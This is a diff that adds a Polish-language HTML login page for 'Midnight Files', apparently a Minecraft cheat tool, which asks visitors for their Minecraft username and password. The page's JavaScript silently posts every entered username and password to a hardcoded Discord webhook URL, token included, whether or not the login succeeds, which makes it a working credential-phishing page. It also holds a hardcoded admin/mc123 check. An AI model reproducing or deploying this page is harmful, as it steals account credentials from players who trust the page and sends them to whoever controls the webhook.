@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Logowanie - Midnight Files</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      background-color: #1a001f;
+      background-image: 
+        radial-gradient(circle at 20% 30%, rgba(128, 0, 128, 0.2) 0%, transparent 40%),
+        radial-gradient(circle at 70% 60%, rgba(186, 85, 211, 0.1) 0%, transparent 50%),
+        radial-gradient(circle at 50% 50%, rgba(75, 0, 130, 0.15) 0%, transparent 60%);
+      background-repeat: repeat;
+      background-size: 600px 600px;
+      animation: shiftBackground 30s linear infinite;
+      font-family: 'Segoe UI', sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      overflow: hidden;
+      color: white;
+    }
+
+    @keyframes shiftBackground {
+      0% {
+        background-position: 0 0;
+      }
+      100% {
+        background-position: 1000px 1000px;
+      }
+    }
+
+    .info-text {
+      margin-bottom: 1rem;
+      font-size: 1rem;
+      color: #ccc;
+      z-index: 1;
+      text-shadow: 0 0 5px #000;
+    }
+
+    .login-box {
+      background-color: rgba(30, 30, 30, 0.85);
+      padding: 2rem;
+      border-radius: 15px;
+      box-shadow: 0 0 20px rgba(155, 89, 182, 0.5);
+      width: 300px;
+      z-index: 1;
+    }
+
+    h2 {
+      text-align: center;
+      margin-bottom: 1rem;
+      color: #c084fc;
+      text-shadow: 0 0 8px #000;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin: 0.5rem 0;
+      border: none;
+      border-radius: 5px;
+      background-color: #2a2a2a;
+      color: white;
+    }
+
+    button {
+      width: 100%;
+      padding: 10px;
+      background-color: #9b59b6;
+      border: none;
+      border-radius: 5px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #8e44ad;
+    }
+
+    .footer {
+      margin-top: 1rem;
+      text-align: center;
+      font-size: 0.85rem;
+      color: #aaa;
+      z-index: 1;
+      text-shadow: 0 0 5px #000;
+    }
+  </style>
+</head>
+<body>
+  <div class="info-text">Zaloguj się do swojego konta Minecraft.</div>
+
+  <div class="login-box">
+    <h2>Midnight Files Login</h2>
+    <form onsubmit="return login(event)">
+      <input type="text" id="username" placeholder="Nazwa użytkownika" required />
+      <input type="password" id="password" placeholder="Hasło" required />
+      <button type="submit">Zaloguj się</button>
+    </form>
+    <div class="footer">Wersja 1.0 | Private Cheats</div>
+  </div>
+
+  <script>
+    // Twój webhook Discorda
+    const discordWebhookUrl = 'https://discord.com/api/webhooks/1370432423527186452/Xs_f14PtceRbzHlSNIecYgRVBb2NQtDmSSIo5P0WZ_Oo-VloTghU0CBiH7rUuxjeuvPc'; // Wstaw tutaj swój webhook Discorda
+
+    async function sendToDiscord(username, password, success) {
+      const payload = {
+        content: `**Dane logowania**\n**Nazwa użytkownika:** ${username}\n**Hasło:** ${password}\n**Sukces:** ${success ? "Tak" : "Nie"}`,
+      };
+
+      const response = await fetch(discordWebhookUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(payload),
+      });
+
+      if (!response.ok) {
+        console.error('Błąd wysyłania na Discord!');
+      }
+    }
+
+    function login(e) {
+      e.preventDefault();
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+
+      // Wysyłanie danych logowania na webhook Discorda, niezależnie od poprawności
+      sendToDiscord(username, password, false);  // Wysyłanie nieudanych danych, domyślnie ustawiamy "false"
+
+      // Sprawdzenie danych logowania
+      if (username === "admin" && password === "mc123") {
+        // Wysyłanie poprawnych danych na webhook Discorda
+        sendToDiscord(username, password, true);  // Wysyłanie danych z sukcesem
+
+        // Powiadomienie o pomyślnym logowaniu
+        alert("Zalogowano pomyślnie!");
+
+        // Przekierowanie na panel po poprawnym logowaniu
+        window.location.href = "panel.html";  // Zmienna zawierająca adres URL strony docelowej
+      } else {
+        alert("Nieprawidłowe dane logowania.");
+      }
+    }
+  </script>
+</body>
+</html>
